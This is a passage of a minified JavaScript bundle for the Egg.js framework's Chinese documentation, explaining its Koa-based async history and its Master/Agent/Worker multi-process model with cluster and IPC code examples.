",r.a.createElement("code",null,"async function")," \u6765\u5f00\u53d1\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5e95\u5c42\u57fa\u4e8e Koa 1.x\uff0c\u5f02\u6b65\u89e3\u51b3\u65b9\u6848\u57fa\u4e8e ",r.a.createElement(l["Link"],{to:"https://github.com/tj/co"},"co")," \u5c01\u88c5\u7684 generator function\u3002"),r.a.createElement("li",null,"\u5b98\u65b9\u63d2\u4ef6\u4ee5\u53ca Egg \u6838\u5fc3\u4f7f\u7528 generator function \u7f16\u5199\uff0c\u4fdd\u6301\u5bf9 Node.js LTS \u7248\u672c\u7684\u652f\u6301\uff0c\u5728\u5fc5\u8981\u5904\u901a\u8fc7 co \u5305\u88c5\u4ee5\u517c\u5bb9\u5728 async function \u4e2d\u7684\u4f7f\u7528\u3002"),r.a.createElement("li",null,"\u5e94\u7528\u5f00\u53d1\u8005\u53ef\u4ee5\u9009\u62e9 async function\uff08Node.js 8.x+\uff09 \u6216\u8005 generator function\uff08Node.js 6.x+\uff09\u8fdb\u884c\u7f16\u5199\u3002")),r.a.createElement("h4",{id:"egg-2x"},r.a.createElement(l["AnchorLink"],{to:"#egg-2x","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Egg 2.x"),r.a.createElement("p",null,"Node.js 8 \u6b63\u5f0f\u8fdb\u5165 LTS \u540e\uff0casync function \u53ef\u4ee5\u5728 Node.js \u4e2d\u4f7f\u7528\u5e76\u4e14\u6ca1\u6709\u4efb\u4f55\u6027\u80fd\u95ee\u9898\u4e86\uff0cEgg 2.x \u57fa\u4e8e Koa 2.x\uff0c\u6846\u67b6\u5e95\u5c42\u4ee5\u53ca\u6240\u6709\u5185\u7f6e\u63d2\u4ef6\u90fd\u4f7f\u7528 async function \u7f16\u5199\uff0c\u5e76\u4fdd\u6301\u4e86\u5bf9 Egg 1.x \u4ee5\u53ca generator function \u7684\u5b8c\u5168\u517c\u5bb9\uff0c\u5e94\u7528\u5c42\u53ea\u9700\u8981\u5347\u7ea7\u5230 Node.js 8 \u5373\u53ef\u4ece Egg 1.x \u8fc1\u79fb\u5230 Egg 2.x\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5e95\u5c42\u57fa\u4e8e Koa 2.x\uff0c\u5f02\u6b65\u89e3\u51b3\u65b9\u6848\u57fa\u4e8e async function\u3002"),r.a.createElement("li",null,"\u5b98\u65b9\u63d2\u4ef6\u4ee5\u53ca Egg \u6838\u5fc3\u4f7f\u7528 async function \u7f16\u5199\u3002"),r.a.createElement("li",null,"\u5efa\u8bae\u4e1a\u52a1\u5c42\u8fc1\u79fb\u5230 async function \u65b9\u6848\u3002"),r.a.createElement("li",null,"\u53ea\u652f\u6301 Node.js 8 \u53ca\u4ee5\u4e0a\u7684\u7248\u672c\u3002"))))}));t["default"]=e=>{var t=r.a.useContext(l["context"]),n=t.demos;return r.a.useEffect((()=>{var t;null!==e&&void 0!==e&&null!==(t=e.location)&&void 0!==t&&t.hash&&l["AnchorLink"].scrollToAnchor(decodeURIComponent(e.location.hash.slice(1)))}),[]),r.a.createElement(i,{demos:n})}},"93kG":function(e,t,n){var a=n("A0UU"),r=n("fJSU"),l=a.WeakMap;e.exports="function"===typeof l&&/native code/.test(r(l))},"9Rcy":function(e,t,n){var a=n("Xdqv");e.exports=!a((function(){return 7!=Object.defineProperty({},1,{get:function(){return 7}})[1]}))},"9WkI":function(e,t,n){"use strict";n.r(t);var a=n("FU0I"),r=n.n(a),l=n("j00X"),o=n("P/fr"),i=n("3dEy"),c=r.a.memo((e=>{e.demos;return r.a.createElement(r.a.Fragment,null,r.a.createElement("div",{className:"markdown"},r.a.createElement("p",null,"\u6211\u4eec\u77e5\u9053 JavaScript \u4ee3\u7801\u662f\u8fd0\u884c\u5728\u5355\u7ebf\u7a0b\u4e0a\u7684\uff0c\u6362\u53e5\u8bdd\u8bf4\u4e00\u4e2a Node.js \u8fdb\u7a0b\u53ea\u80fd\u8fd0\u884c\u5728\u4e00\u4e2a CPU \u4e0a\u3002\u90a3\u4e48\u5982\u679c\u7528 Node.js \u6765\u505a Web Server\uff0c\u5c31\u65e0\u6cd5\u4eab\u53d7\u5230\u591a\u6838\u8fd0\u7b97\u7684\u597d\u5904\u3002\u4f5c\u4e3a\u4f01\u4e1a\u7ea7\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u6211\u4eec\u8981\u89e3\u51b3\u7684\u4e00\u4e2a\u95ee\u9898\u5c31\u662f:"),r.a.createElement("blockquote",null,r.a.createElement("p",null,"\u5982\u4f55\u69a8\u5e72\u670d\u52a1\u5668\u8d44\u6e90\uff0c\u5229\u7528\u4e0a\u591a\u6838 CPU \u7684\u5e76\u53d1\u4f18\u52bf\uff1f")),r.a.createElement("p",null,"\u800c Node.js \u5b98\u65b9\u63d0\u4f9b\u7684\u89e3\u51b3\u65b9\u6848\u662f ",r.a.createElement(l["Link"],{to:"https://nodejs.org/api/cluster.html"},"Cluster \u6a21\u5757"),"\uff0c\u5176\u4e2d\u5305\u542b\u4e00\u6bb5\u7b80\u4ecb\uff1a"),r.a.createElement("blockquote",null,r.a.createElement("p",null,"\u5355\u4e2a Node.js \u5b9e\u4f8b\u5728\u5355\u7ebf\u7a0b\u73af\u5883\u4e0b\u8fd0\u884c\u3002\u4e3a\u4e86\u66f4\u597d\u5730\u5229\u7528\u591a\u6838\u73af\u5883\uff0c\u7528\u6237\u6709\u65f6\u5e0c\u671b\u542f\u52a8\u4e00\u6279 Node.js \u8fdb\u7a0b\u7528\u4e8e\u52a0\u8f7d\u3002"),r.a.createElement("p",null,"\u96c6\u7fa4\u5316\u6a21\u5757\u4f7f\u5f97\u4f60\u5f88\u65b9\u4fbf\u5730\u521b\u5efa\u5b50\u8fdb\u7a0b\uff0c\u4ee5\u4fbf\u4e8e\u5728\u670d\u52a1\u7aef\u53e3\u4e4b\u95f4\u5171\u4eab\u3002")),r.a.createElement("h2",{id:"cluster-\u662f\u4ec0\u4e48\u5462"},r.a.createElement(l["AnchorLink"],{to:"#cluster-\u662f\u4ec0\u4e48\u5462","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Cluster \u662f\u4ec0\u4e48\u5462\uff1f"),r.a.createElement("p",null,"\u7b80\u5355\u7684\u8bf4\uff0c"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u5728\u670d\u52a1\u5668\u4e0a\u540c\u65f6\u542f\u52a8\u591a\u4e2a\u8fdb\u7a0b\u3002"),r.a.createElement("li",null,"\u6bcf\u4e2a\u8fdb\u7a0b\u91cc\u90fd\u8dd1\u7684\u662f\u540c\u4e00\u4efd\u6e90\u4ee3\u7801\uff08\u597d\u6bd4\u628a\u4ee5\u524d\u4e00\u4e2a\u8fdb\u7a0b\u7684\u5de5\u4f5c\u5206\u7ed9\u591a\u4e2a\u8fdb\u7a0b\u53bb\u505a\uff09\u3002"),r.a.createElement("li",null,"\u66f4\u795e\u5947\u7684\u662f\uff0c\u8fd9\u4e9b\u8fdb\u7a0b\u53ef\u4ee5\u540c\u65f6\u76d1\u542c\u4e00\u4e2a\u7aef\u53e3\uff08\u5177\u4f53\u539f\u7406\u63a8\u8350\u9605\u8bfb @DavidCai1993 \u8fd9\u7bc7 ",r.a.createElement(l["Link"],{to:"https://cnodejs.org/topic/56e84480833b7c8a0492e20c"},"Cluster \u5b9e\u73b0\u539f\u7406"),"\uff09\u3002")),r.a.createElement("p",null,"\u5176\u4e2d\uff1a"),r.a.createElement("ul",null,r.a.createElement("li",null,"\u8d1f\u8d23\u542f\u52a8\u5176\u4ed6\u8fdb\u7a0b\u7684\u53eb\u505a Master \u8fdb\u7a0b\uff0c\u4ed6\u597d\u6bd4\u662f\u4e2a\u300e\u5305\u5de5\u5934\u300f\uff0c\u4e0d\u505a\u5177\u4f53\u7684\u5de5\u4f5c\uff0c\u53ea\u8d1f\u8d23\u542f\u52a8\u5176\u4ed6\u8fdb\u7a0b\u3002"),r.a.createElement("li",null,"\u5176\u4ed6\u88ab\u542f\u52a8\u7684\u53eb Worker \u8fdb\u7a0b\uff0c\u987e\u540d\u601d\u4e49\u5c31\u662f\u5e72\u6d3b\u7684\u300e\u5de5\u4eba\u300f\u3002\u5b83\u4eec\u63a5\u6536\u8bf7\u6c42\uff0c\u5bf9\u5916\u63d0\u4f9b\u670d\u52a1\u3002"),r.a.createElement("li",null,"Worker \u8fdb\u7a0b\u7684\u6570\u91cf\u4e00\u822c\u6839\u636e\u670d\u52a1\u5668\u7684 CPU \u6838\u6570\u6765\u5b9a\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u5b8c\u7f8e\u5229\u7528\u591a\u6838\u8d44\u6e90\u3002")),r.a.createElement(o["a"],{code:"const cluster = require('cluster');\nconst http = require('http');\nconst numCPUs = require('os').cpus().length;\n\nif (cluster.isMaster) {\n  // Fork workers.\n  for (let i = 0; i < numCPUs; i++) {\n    cluster.fork();\n  }\n\n  cluster.on('exit', function (worker, code, signal) {\n    console.log('worker ' + worker.process.pid + ' died');\n  });\n} else {\n  // Workers can share any TCP connection\n  // In this case it is an HTTP server\n  http\n    .createServer(function (req, res) {\n      res.writeHead(200);\n      res.end('hello world\\n');\n    })\n    .listen(8000);\n}",lang:"js"}),r.a.createElement("h2",{id:"\u6846\u67b6\u7684\u591a\u8fdb\u7a0b\u6a21\u578b"},r.a.createElement(l["AnchorLink"],{to:"#\u6846\u67b6\u7684\u591a\u8fdb\u7a0b\u6a21\u578b","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u6846\u67b6\u7684\u591a\u8fdb\u7a0b\u6a21\u578b"),r.a.createElement("p",null,"\u4e0a\u9762\u7684\u793a\u4f8b\u662f\u4e0d\u662f\u5f88\u7b80\u5355\uff0c\u4f46\u662f\u4f5c\u4e3a\u4f01\u4e1a\u7ea7\u7684\u89e3\u51b3\u65b9\u6848\uff0c\u8981\u8003\u8651\u7684\u4e1c\u897f\u8fd8\u6709\u5f88\u591a\u3002"),r.a.createElement("ul",null,r.a.createElement("li",null,"Worker \u8fdb\u7a0b\u5f02\u5e38\u9000\u51fa\u4ee5\u540e\u8be5\u5982\u4f55\u5904\u7406\uff1f"),r.a.createElement("li",null,"\u591a\u4e2a Worker \u8fdb\u7a0b\u4e4b\u95f4\u5982\u4f55\u5171\u4eab\u8d44\u6e90\uff1f"),r.a.createElement("li",null,"\u591a\u4e2a Worker \u8fdb\u7a0b\u4e4b\u95f4\u5982\u4f55\u8c03\u5ea6\uff1f"),r.a.createElement("li",null,"...")),r.a.createElement("h3",{id:"\u8fdb\u7a0b\u5b88\u62a4"},r.a.createElement(l["AnchorLink"],{to:"#\u8fdb\u7a0b\u5b88\u62a4","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u8fdb\u7a0b\u5b88\u62a4"),r.a.createElement("p",null,"\u5065\u58ee\u6027\uff08\u53c8\u53eb\u9c81\u68d2\u6027\uff09\u662f\u4f01\u4e1a\u7ea7\u5e94\u7528\u5fc5\u987b\u8003\u8651\u7684\u95ee\u9898\uff0c\u9664\u4e86\u7a0b\u5e8f\u672c\u8eab\u4ee3\u7801\u8d28\u91cf\u8981\u4fdd\u8bc1\uff0c\u6846\u67b6\u5c42\u9762\u4e5f\u9700\u8981\u63d0\u4f9b\u76f8\u5e94\u7684\u300e\u515c\u5e95\u300f\u673a\u5236\u4fdd\u8bc1\u6781\u7aef\u60c5\u51b5\u4e0b\u5e94\u7528\u7684\u53ef\u7528\u6027\u3002"),r.a.createElement("p",null,"\u4e00\u822c\u6765\u8bf4\uff0cNode.js \u8fdb\u7a0b\u9000\u51fa\u53ef\u4ee5\u5206\u4e3a\u4e24\u7c7b\uff1a"),r.a.createElement("h4",{id:"\u672a\u6355\u83b7\u5f02\u5e38"},r.a.createElement(l["AnchorLink"],{to:"#\u672a\u6355\u83b7\u5f02\u5e38","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"\u672a\u6355\u83b7\u5f02\u5e38"),r.a.createElement("p",null,"\u5f53\u4ee3\u7801\u629b\u51fa\u4e86\u5f02\u5e38\u6ca1\u6709\u88ab\u6355\u83b7\u5230\u65f6\uff0c\u8fdb\u7a0b\u5c06\u4f1a\u9000\u51fa\uff0c\u6b64\u65f6 Node.js \u63d0\u4f9b\u4e86 ",r.a.createElement("code",null,"process.on('uncaughtException', handler)")," \u63a5\u53e3\u6765\u6355\u83b7\u5b83\uff0c\u4f46\u662f\u5f53\u4e00\u4e2a Worker \u8fdb\u7a0b\u9047\u5230 ",r.a.createElement(l["Link"],{to:"https://nodejs.org/dist/latest-v6.x/docs/api/process.html#process_event_uncaughtexception"},"\u672a\u6355\u83b7\u7684\u5f02\u5e38")," \u65f6\uff0c\u5b83\u5df2\u7ecf\u5904\u4e8e\u4e00\u4e2a\u4e0d\u786e\u5b9a\u72b6\u6001\uff0c\u6b64\u65f6\u6211\u4eec\u5e94\u8be5\u8ba9\u8fd9\u4e2a\u8fdb\u7a0b\u4f18\u96c5\u9000\u51fa\uff1a"),r.a.createElement("ol",null,r.a.createElement("li",null,"\u5173\u95ed\u5f02\u5e38 Worker \u8fdb\u7a0b\u6240\u6709\u7684 TCP Server\uff08\u5c06\u5df2\u6709\u7684\u8fde\u63a5\u5feb\u901f\u65ad\u5f00\uff0c\u4e14\u4e0d\u518d\u63a5\u6536\u65b0\u7684\u8fde\u63a5\uff09\uff0c\u65ad\u5f00\u548c Master \u7684 IPC \u901a\u9053\uff0c\u4e0d\u518d\u63a5\u53d7\u65b0\u7684\u7528\u6237\u8bf7\u6c42\u3002"),r.a.createElement("li",null,"Master \u7acb\u523b fork \u4e00\u4e2a\u65b0\u7684 Worker \u8fdb\u7a0b\uff0c\u4fdd\u8bc1\u5728\u7ebf\u7684\u300e\u5de5\u4eba\u300f\u603b\u6570\u4e0d\u53d8\u3002"),r.a.createElement("li",null,"\u5f02\u5e38 Worker \u7b49\u5f85\u4e00\u6bb5\u65f6\u95f4\uff0c\u5904\u7406\u5b8c\u5df2\u7ecf\u63a5\u53d7\u7684\u8bf7\u6c42\u540e\u9000\u51fa\u3002")),r.a.createElement(o["a"],{code:"+---------+                 +---------+\n   |  Worker |                 |  Master |\n   +---------+                 +----+----+\n        | uncaughtException         |\n        +------------+              |\n        |            |              |                   +---------+\n        | <----------+              |                   |  Worker |\n        |                           |                   +----+----+\n        |        disconnect         |   fork a new worker    |\n        +-------------------------\x3e + ---------------------\x3e |\n        |         wait...           |                        |\n        |          exit             |                        |\n        +-------------------------\x3e |                        |\n        |                           |                        |\n       die                          |                        |\n                                    |                        |\n                                    |                        |",lang:"bash"}),r.a.createElement("h4",{id:"oom\u7cfb\u7edf\u5f02\u5e38"},r.a.createElement(l["AnchorLink"],{to:"#oom\u7cfb\u7edf\u5f02\u5e38","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"OOM\u3001\u7cfb\u7edf\u5f02\u5e38"),r.a.createElement("p",null,"\u800c\u5f53\u4e00\u4e2a\u8fdb\u7a0b\u51fa\u73b0\u5f02\u5e38\u5bfc\u81f4 crash \u6216\u8005 OOM \u88ab\u7cfb\u7edf\u6740\u6b7b\u65f6\uff0c\u4e0d\u50cf\u672a\u6355\u83b7\u5f02\u5e38\u53d1\u751f\u65f6\u6211\u4eec\u8fd8\u6709\u673a\u4f1a\u8ba9\u8fdb\u7a0b\u7ee7\u7eed\u6267\u884c\uff0c\u53ea\u80fd\u591f\u8ba9\u5f53\u524d\u8fdb\u7a0b\u76f4\u63a5\u9000\u51fa\uff0cMaster \u7acb\u523b fork \u4e00\u4e2a\u65b0\u7684 Worker\u3002"),r.a.createElement("p",null,"\u5728\u6846\u67b6\u91cc\uff0c\u6211\u4eec\u91c7\u7528 ",r.a.createElement(l["Link"],{to:"https://github.com/node-modules/graceful"},"graceful")," \u548c ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-cluster"},"egg-cluster")," \u4e24\u4e2a\u6a21\u5757\u914d\u5408\u5b9e\u73b0\u4e0a\u9762\u7684\u903b\u8f91\u3002\u8fd9\u5957\u65b9\u6848\u5df2\u5728\u963f\u91cc\u5df4\u5df4\u548c\u8682\u8681\u91d1\u670d\u7684\u751f\u4ea7\u73af\u5883\u5e7f\u6cdb\u90e8\u7f72\uff0c\u4e14\u7ecf\u53d7\u8fc7\u300e\u53cc 11\u300f\u5927\u4fc3\u7684\u8003\u9a8c\uff0c\u6240\u4ee5\u662f\u76f8\u5bf9\u7a33\u5b9a\u548c\u9760\u8c31\u7684\u3002"),r.a.createElement("h3",{id:"agent-\u673a\u5236"},r.a.createElement(l["AnchorLink"],{to:"#agent-\u673a\u5236","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Agent \u673a\u5236"),r.a.createElement("p",null,"\u8bf4\u5230\u8fd9\u91cc\uff0cNode.js \u591a\u8fdb\u7a0b\u65b9\u6848\u8c8c\u4f3c\u5df2\u7ecf\u6210\u578b\uff0c\u8fd9\u4e5f\u662f\u6211\u4eec\u65e9\u671f\u7ebf\u4e0a\u4f7f\u7528\u7684\u65b9\u6848\u3002\u4f46\u540e\u6765\u6211\u4eec\u53d1\u73b0\u6709\u4e9b\u5de5\u4f5c\u5176\u5b9e\u4e0d\u9700\u8981\u6bcf\u4e2a Worker \u90fd\u53bb\u505a\uff0c\u5982\u679c\u90fd\u505a\uff0c\u4e00\u6765\u662f\u6d6a\u8d39\u8d44\u6e90\uff0c\u66f4\u91cd\u8981\u7684\u662f\u53ef\u80fd\u4f1a\u5bfc\u81f4\u591a\u8fdb\u7a0b\u95f4\u8d44\u6e90\u8bbf\u95ee\u51b2\u7a81\u3002\u4e3e\u4e2a\u4f8b\u5b50\uff1a\u751f\u4ea7\u73af\u5883\u7684\u65e5\u5fd7\u6587\u4ef6\u6211\u4eec\u4e00\u822c\u4f1a\u6309\u7167\u65e5\u671f\u8fdb\u884c\u5f52\u6863\uff0c\u5728\u5355\u8fdb\u7a0b\u6a21\u578b\u4e0b\u8fd9\u518d\u7b80\u5355\u4e0d\u8fc7\u4e86\uff1a"),r.a.createElement("blockquote",null,r.a.createElement("ol",null,r.a.createElement("li",null,"\u6bcf\u5929\u51cc\u6668 0 \u70b9\uff0c\u5c06\u5f53\u524d\u65e5\u5fd7\u6587\u4ef6\u6309\u7167\u65e5\u671f\u8fdb\u884c\u91cd\u547d\u540d"),r.a.createElement("li",null,"\u9500\u6bc1\u4ee5\u524d\u7684\u6587\u4ef6\u53e5\u67c4\uff0c\u5e76\u521b\u5efa\u65b0\u7684\u65e5\u5fd7\u6587\u4ef6\u7ee7\u7eed\u5199\u5165"))),r.a.createElement("p",null,"\u8bd5\u60f3\u5982\u679c\u73b0\u5728\u662f 4 \u4e2a\u8fdb\u7a0b\u6765\u505a\u540c\u6837\u7684\u4e8b\u60c5\uff0c\u662f\u4e0d\u662f\u5c31\u4e71\u5957\u4e86\u3002\u6240\u4ee5\uff0c\u5bf9\u4e8e\u8fd9\u4e00\u7c7b\u540e\u53f0\u8fd0\u884c\u7684\u903b\u8f91\uff0c\u6211\u4eec\u5e0c\u671b\u5c06\u5b83\u4eec\u653e\u5230\u4e00\u4e2a\u5355\u72ec\u7684\u8fdb\u7a0b\u4e0a\u53bb\u6267\u884c\uff0c\u8fd9\u4e2a\u8fdb\u7a0b\u5c31\u53eb Agent Worker\uff0c\u7b80\u79f0 Agent\u3002Agent \u597d\u6bd4\u662f Master \u7ed9\u5176\u4ed6 Worker \u8bf7\u7684\u4e00\u4e2a\u300e\u79d8\u4e66\u300f\uff0c\u5b83\u4e0d\u5bf9\u5916\u63d0\u4f9b\u670d\u52a1\uff0c\u53ea\u7ed9 App Worker \u6253\u5de5\uff0c\u4e13\u95e8\u5904\u7406\u4e00\u4e9b\u516c\u5171\u4e8b\u52a1\u3002\u73b0\u5728\u6211\u4eec\u7684\u591a\u8fdb\u7a0b\u6a21\u578b\u5c31\u53d8\u6210\u4e0b\u9762\u8fd9\u4e2a\u6837\u5b50\u4e86"),r.a.createElement(o["a"],{code:"+--------+          +-------+\n                  | Master |<--------\x3e| Agent |\n                  +--------+          +-------+\n                  ^   ^    ^\n                 /    |     \\\n               /      |       \\\n             /        |         \\\n           v          v          v\n  +----------+   +----------+   +----------+\n  | Worker 1 |   | Worker 2 |   | Worker 3 |\n  +----------+   +----------+   +----------+",lang:"bash"}),r.a.createElement("p",null,"\u90a3\u6211\u4eec\u6846\u67b6\u7684\u542f\u52a8\u65f6\u5e8f\u5982\u4e0b\uff1a"),r.a.createElement(o["a"],{code:"+---------+           +---------+          +---------+\n    |  Master |           |  Agent  |          |  Worker |\n    +---------+           +----+----+          +----+----+\n         |      fork agent     |                    |\n         +--------------------\x3e|                    |\n         |      agent ready    |                    |\n         |<--------------------+                    |\n         |                     |     fork worker    |\n         +-----------------------------------------\x3e|\n         |     worker ready    |                    |\n         |<-----------------------------------------+\n         |      Egg ready      |                    |\n         +--------------------\x3e|                    |\n         |      Egg ready      |                    |\n         +-----------------------------------------\x3e|",lang:"bash"}),r.a.createElement("ol",null,r.a.createElement("li",null,"Master \u542f\u52a8\u540e\u5148 fork Agent \u8fdb\u7a0b"),r.a.createElement("li",null,"Agent \u521d\u59cb\u5316\u6210\u529f\u540e\uff0c\u901a\u8fc7 IPC \u901a\u9053\u901a\u77e5 Master"),r.a.createElement("li",null,"Master \u518d fork \u591a\u4e2a App Worker"),r.a.createElement("li",null,"App Worker \u521d\u59cb\u5316\u6210\u529f\uff0c\u901a\u77e5 Master"),r.a.createElement("li",null,"\u6240\u6709\u7684\u8fdb\u7a0b\u521d\u59cb\u5316\u6210\u529f\u540e\uff0cMaster \u901a\u77e5 Agent \u548c Worker \u5e94\u7528\u542f\u52a8\u6210\u529f")),r.a.createElement("p",null,"\u53e6\u5916\uff0c\u5173\u4e8e Agent Worker \u8fd8\u6709\u51e0\u70b9\u9700\u8981\u6ce8\u610f\u7684\u662f\uff1a"),r.a.createElement("ol",null,r.a.createElement("li",null,"\u7531\u4e8e App Worker \u4f9d\u8d56\u4e8e Agent\uff0c\u6240\u4ee5\u5fc5\u987b\u7b49 Agent \u521d\u59cb\u5316\u5b8c\u6210\u540e\u624d\u80fd fork App Worker"),r.a.createElement("li",null,"Agent \u867d\u7136\u662f App Worker \u7684\u300e\u5c0f\u79d8\u300f\uff0c\u4f46\u662f\u4e1a\u52a1\u76f8\u5173\u7684\u5de5\u4f5c\u4e0d\u5e94\u8be5\u653e\u5230 Agent \u4e0a\u53bb\u505a\uff0c\u4e0d\u7136\u628a\u5979\u7d2f\u57ae\u4e86\u5c31\u4e0d\u597d\u4e86"),r.a.createElement("li",null,"\u7531\u4e8e Agent \u7684\u7279\u6b8a\u5b9a\u4f4d\uff0c",r.a.createElement("strong",null,"\u6211\u4eec\u5e94\u8be5\u4fdd\u8bc1\u5b83\u76f8\u5bf9\u7a33\u5b9a"),"\u3002\u5f53\u5b83\u53d1\u751f\u672a\u6355\u83b7\u5f02\u5e38\uff0c\u6846\u67b6\u4e0d\u4f1a\u50cf App Worker \u4e00\u6837\u8ba9\u4ed6\u9000\u51fa\u91cd\u542f\uff0c\u800c\u662f\u8bb0\u5f55\u5f02\u5e38\u65e5\u5fd7\u3001\u62a5\u8b66\u7b49\u5f85\u4eba\u5de5\u5904\u7406"),r.a.createElement("li",null,"Agent \u548c\u666e\u901a App Worker \u6302\u8f7d\u7684 API \u4e0d\u5b8c\u5168\u4e00\u6837\uff0c\u5982\u4f55\u8bc6\u522b\u5dee\u5f02\u53ef\u67e5\u770b",r.a.createElement(l["Link"],{to:"../advanced/framework"},"\u6846\u67b6\u6587\u6863"))),r.a.createElement("h3",{id:"agent-\u7684\u7528\u6cd5"},r.a.createElement(l["AnchorLink"],{to:"#agent-\u7684\u7528\u6cd5","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Agent \u7684\u7528\u6cd5"),r.a.createElement("p",null,"\u4f60\u53ef\u4ee5\u5728\u5e94\u7528\u6216\u63d2\u4ef6\u6839\u76ee\u5f55\u4e0b\u7684 ",r.a.createElement("code",null,"agent.js")," \u4e2d\u5b9e\u73b0\u4f60\u81ea\u5df1\u7684\u903b\u8f91\uff08\u548c",r.a.createElement(l["Link"],{to:"../basics/app-start"},"\u542f\u52a8\u81ea\u5b9a\u4e49")," \u7528\u6cd5\u7c7b\u4f3c\uff0c\u53ea\u662f\u5165\u53e3\u53c2\u6570\u662f agent \u5bf9\u8c61\uff09"),r.a.createElement(o["a"],{code:"// agent.js\nmodule.exports = agent => {\n  // \u5728\u8fd9\u91cc\u5199\u4f60\u7684\u521d\u59cb\u5316\u903b\u8f91\n\n  // \u4e5f\u53ef\u4ee5\u901a\u8fc7 messenger \u5bf9\u8c61\u53d1\u9001\u6d88\u606f\u7ed9 App Worker\n  // \u4f46\u9700\u8981\u7b49\u5f85 App Worker \u542f\u52a8\u6210\u529f\u540e\u624d\u80fd\u53d1\u9001\uff0c\u4e0d\u7136\u5f88\u53ef\u80fd\u4e22\u5931\n  agent.messenger.on('egg-ready', () => {\n    const data = { ... };\n    agent.messenger.sendToApp('xxx_action', data);\n  });\n};",lang:"js"}),r.a.createElement(o["a"],{code:"// app.js\nmodule.exports = (app) => {\n  app.messenger.on('xxx_action', (data) => {\n    // ...\n  });\n};",lang:"js"}),r.a.createElement("p",null,"\u8fd9\u4e2a\u4f8b\u5b50\u4e2d\uff0c",r.a.createElement("code",null,"agent.js")," \u7684\u4ee3\u7801\u4f1a\u6267\u884c\u5728 agent \u8fdb\u7a0b\u4e0a\uff0c",r.a.createElement("code",null,"app.js")," \u7684\u4ee3\u7801\u4f1a\u6267\u884c\u5728 Worker \u8fdb\u7a0b\u4e0a\uff0c\u4ed6\u4eec\u901a\u8fc7\u6846\u67b6\u5c01\u88c5\u7684 ",r.a.createElement("code",null,"messenger")," \u5bf9\u8c61\u8fdb\u884c\u8fdb\u7a0b\u95f4\u901a\u8baf\uff08IPC\uff09\uff0c\u540e\u9762\u7684\u7ae0\u8282\u4f1a\u5bf9\u6846\u67b6\u7684 IPC \u505a\u8be6\u7ec6\u7684\u8bb2\u89e3\u3002"),r.a.createElement("h3",{id:"master-vs-agent-vs-worker"},r.a.createElement(l["AnchorLink"],{to:"#master-vs-agent-vs-worker","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Master VS Agent VS Worker"),r.a.createElement("p",null,"\u5f53\u4e00\u4e2a\u5e94\u7528\u542f\u52a8\u65f6\uff0c\u4f1a\u540c\u65f6\u542f\u52a8\u8fd9\u4e09\u7c7b\u8fdb\u7a0b\u3002"),r.a.createElement(i["a"],null,r.a.createElement("thead",null,r.a.createElement("tr",null,r.a.createElement("th",null,"\u7c7b\u578b"),r.a.createElement("th",null,"\u8fdb\u7a0b\u6570\u91cf"),r.a.createElement("th",null,"\u4f5c\u7528"),r.a.createElement("th",null,"\u7a33\u5b9a\u6027"),r.a.createElement("th",null,"\u662f\u5426\u8fd0\u884c\u4e1a\u52a1\u4ee3\u7801"))),r.a.createElement("tbody",null,r.a.createElement("tr",null,r.a.createElement("td",null,"Master"),r.a.createElement("td",null,"1"),r.a.createElement("td",null,"\u8fdb\u7a0b\u7ba1\u7406\uff0c\u8fdb\u7a0b\u95f4\u6d88\u606f\u8f6c\u53d1"),r.a.createElement("td",null,"\u975e\u5e38\u9ad8"),r.a.createElement("td",null,"\u5426")),r.a.createElement("tr",null,r.a.createElement("td",null,"Agent"),r.a.createElement("td",null,"1"),r.a.createElement("td",null,"\u540e\u53f0\u8fd0\u884c\u5de5\u4f5c\uff08\u957f\u8fde\u63a5\u5ba2\u6237\u7aef\uff09"),r.a.createElement("td",null,"\u9ad8"),r.a.createElement("td",null,"\u5c11\u91cf")),r.a.createElement("tr",null,r.a.createElement("td",null,"Worker"),r.a.createElement("td",null,"\u4e00\u822c\u8bbe\u7f6e\u4e3a CPU \u6838\u6570"),r.a.createElement("td",null,"\u6267\u884c\u4e1a\u52a1\u4ee3\u7801"),r.a.createElement("td",null,"\u4e00\u822c"),r.a.createElement("td",null,"\u662f")))),r.a.createElement("h4",{id:"master"},r.a.createElement(l["AnchorLink"],{to:"#master","aria-hidden":"true",tabIndex:-1},r.a.createElement("span",{className:"icon icon-link"})),"Master"),r.a.createElement("p",null,"\u5728\u8fd9\u4e2a\u6a21\u578b\u4e0b\uff0cMaster \u8fdb\u7a0b\u627f\u62c5\u4e86\u8fdb\u7a0b\u7ba1\u7406\u7684\u5de5\u4f5c\uff08\u7c7b\u4f3c ",r.a.createElement(l["Link"],{to:"https://github.com/Unitech/pm2"},"pm2"),"\uff09\uff0c\u4e0d\u8fd0\u884c\u4efb\u4f55\u4e1a\u52a1\u4ee3\u7801\uff0c\u6211\u4eec\u53ea\u9700\u8981\u8fd0\u884c\u8d77\u4e00\u4e2a Master \u8fdb\u7a0b\u5b83\u5c31\u4f1a\u5e2e\u6211\u4eec\u641e\u5b9a\u6240\u6709\u7684 Worker\u3001Agent \u8fdb\u7a0b\u7684\u521d\u59cb\u5316\u4ee5\u53ca\u91cd\u542f\u7b49\u5de5\u4f5c\u4e86\u3002"),r.a.createElement("p",null,"Master \u8fdb\u7a0b\u7684\u7a33\u5b9a\u6027\u662f\u6781\u9ad8\u7684\uff0c\u7ebf\u4e0a\u8fd0\u884c\u65f6\u6211\u4eec\u53ea\u9700\u8981\u901a\u8fc7 ",r.a.createElement(l["Link"],{to:"https://github.com/eggjs/egg-scripts"},"egg-scripts")," \u540e\u53f0\u8fd0\u884c\u901a\u8fc7 